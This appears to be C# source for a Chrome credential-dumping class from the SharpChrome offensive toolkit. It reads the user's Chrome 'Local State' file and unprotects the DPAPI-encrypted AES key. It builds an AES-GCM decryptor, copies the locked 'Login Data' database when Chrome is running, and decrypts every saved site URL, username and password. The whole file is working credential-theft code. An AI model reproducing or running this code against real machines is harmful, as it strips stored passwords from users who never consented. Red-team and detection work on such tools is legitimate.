using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using PInvoke;
using CS_SQLite3;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Data;

namespace SharpChrome
{
    class ChromeCredentialManager
    {
        internal string userDataPath;
        internal string userChromeHistoryPath;
        internal string userChromeBookmarkPath;
        internal string userChromeCookiesPath;
        internal string userChromeLoginDataPath;
        internal string userLocalStatePath;
        internal string googleChromePath;
        internal bool useTmpFile = false;
        internal byte[] aesKey = null;
        internal BCrypt.SafeAlgorithmHandle hAlg = null;
        internal const int AES_BLOCK_SIZE = 16;
        internal BCrypt.SafeKeyHandle hKey = null;

        internal string[] filterDomains = null;

        internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
        internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
        public ChromeCredentialManager(string[] domains = null)
        {
            if (Environment.GetEnvironmentVariable("USERNAME").Contains("SYSTEM"))
                throw new Exception("Cannot decrypt Chrome credentials from a SYSTEM level context.");
            if (domains != null && domains.Length > 0)
                filterDomains = domains;
            string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            hKey = null;
            hAlg = null;
            googleChromePath = Path.Combine(localAppData, "Google\\Chrome\\User Data\\Default\\");
            userChromeLoginDataPath = Path.Combine(googleChromePath, "Login Data");
            userLocalStatePath = Path.Combine(googleChromePath, "Local State");
            if (!ChromeDataExists())
                throw new Exception("User chrome data files not present.");
            Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            if (chromeProcesses.Length > 0)
            {
                useTmpFile = true;
            }
            string key = GetBase64EncryptedKey();
            if (key != "")
            {
                //Console.WriteLine("Normal DPAPI Decryption");
                aesKey = DecryptBase64StateKey(key);
                if (aesKey == null)
                    throw new Exception("Failed to decrypt AES Key.");
                DPAPIChromeAlgKeyFromRaw(aesKey, out hAlg, out hKey);
                if (hAlg == null || hKey == null)
                    throw new Exception("Failed to create BCrypt Symmetric Key.");
            }
        }

        

        private byte[] DecryptBlob(byte[] dwData)
        {
            if (hKey == null && hAlg == null)
                return ProtectedData.Unprotect(dwData, null, DataProtectionScope.CurrentUser);
            byte[] dwDataOut = null;
            // magic decryption happens here
            BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            int dwDataOutLen;
            //IntPtr pDataOut = IntPtr.Zero;
            IntPtr pData = IntPtr.Zero;
            NTSTATUS ntStatus;
            byte[] subArrayNoV10;
            int pcbResult = 0;
            unsafe
            {
                if (ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
                {
                    subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                    Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
                    pData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * dwData.Length);
                 
                    try
                    {
                        
                        //shiftedEncValPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * shiftedEncVal.Length);
                        Marshal.Copy(dwData, 0, pData, dwData.Length);
                        Utils.MiscUtils.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                        info.pbNonce = (byte*)(pData + DPAPI_CHROME_UNKV10.Length);
                        info.cbNonce = 12;
                        info.pbTag = info.pbNonce + dwData.Length - (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                        info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                        dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                        dwDataOut = new byte[dwDataOutLen];

                        fixed(byte* pDataOut = dwDataOut)
                        {
                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, (void*)&info, null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                        }
                        if (NT_SUCCESS(ntStatus))
                        {
                            //Console.WriteLine("{0} : {1}", dwDataOutLen, pDataOut);
                        }
                    }
                    catch (Exception ex)
                    {

                    }
                    finally
                    {
                        if (pData != null && pData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pData);
                      
                    }
                }
            }
            return dwDataOut;
        }

      

        public SavedLogin[] GetSavedLogins()
        {
            string loginData = userChromeLoginDataPath;
            if (useTmpFile)
                loginData = Utils.FileUtils.CreateTempDuplicateFile(loginData);
            SQLiteDatabase database = new SQLiteDatabase(loginData);
            string query = "SELECT action_url, username_value, password_value FROM logins";
            DataTable resultantQuery = database.ExecuteQuery(query);
            List<SavedLogin> logins = new List<SavedLogin>();
            foreach (DataRow row in resultantQuery.Rows)
            {
                string password = String.Empty;
                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
                byte[] decBytes = DecryptBlob(passwordBytes);
                if (decBytes != null)
                    password = Encoding.ASCII.GetString(decBytes);
                if (password != String.Empty)
                {
                    logins.Add(new SavedLogin(row["action_url"].ToString(), row["username_value"].ToString(), password));
                }
            }
            database.CloseDatabase();
            return logins.ToArray();
        }





        private bool ChromeDataExists()
        {
            string[] paths =
            {
                userChromeLoginDataPath,
                userLocalStatePath
            };
            foreach(string path in paths)
            {
                if (File.Exists(path))
                    return true;
            }
            return false;
        }

        public static byte[] DecryptBase64StateKey(string base64Key)
        {
            byte[] encryptedKeyBytes = System.Convert.FromBase64String(base64Key);
            if (ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                //Console.WriteLine("> Key appears to be encrypted using DPAPI");
                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);
                byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return decryptedKey;
            }
            else
            {
                Console.WriteLine("Unknown encoding.");
            }
            return null;
        }

        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex, int len)
        {
            int j = destIndex;
            for (int i = sourceIndex; i < sourceIndex + len; i++)
            {
                if (sourceArray[i] != destArray[j])
                    return false;
                j++;
            }
            return true;
        }

        public static string GetBase64EncryptedKey()
        {
            string localStatePath = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            // something weird happened
            if (localStatePath == "")
                return "";
            localStatePath = Path.Combine(localStatePath, "Google\\Chrome\\User Data\\Local State");
            if (!File.Exists(localStatePath))
                return "";
            string localStateData = File.ReadAllText(localStatePath);
            string searchTerm = "encrypted_key";
            int startIndex = localStateData.IndexOf(searchTerm);
            if (startIndex < 0)
                return "";
            // encrypted_key":"BASE64"
            int keyIndex = startIndex + searchTerm.Length + 3;
            string tempVals = localStateData.Substring(keyIndex);
            int stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";
            string base64Key = tempVals.Substring(0, stopIndex);
            return base64Key;
        }

        private static bool NT_SUCCESS(PInvoke.NTSTATUS status)
        {
            return PInvoke.NTSTATUS.Code.STATUS_SUCCESS == status;
        }

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        public static bool DPAPIChromeAlgKeyFromRaw(byte[] key, out PInvoke.BCrypt.SafeAlgorithmHandle hAlg, out PInvoke.BCrypt.SafeKeyHandle hKey)
        {
            bool bRet = false;
            hAlg = null;
            hKey = null;
            PInvoke.NTSTATUS ntStatus;
            ntStatus = PInvoke.BCrypt.BCryptOpenAlgorithmProvider(out hAlg, PInvoke.BCrypt.AlgorithmIdentifiers.BCRYPT_AES_ALGORITHM, null, 0);
            if (NT_SUCCESS(ntStatus))
            {
                ntStatus = PInvoke.BCrypt.BCryptSetProperty(hAlg, "ChainingMode", PInvoke.BCrypt.ChainingModes.Gcm, 0);
                if (NT_SUCCESS(ntStatus))
                {
                    ntStatus = PInvoke.BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
                    if (NT_SUCCESS(ntStatus))
                        bRet = true;
                }
            }
            return bRet;
        }
    }
}
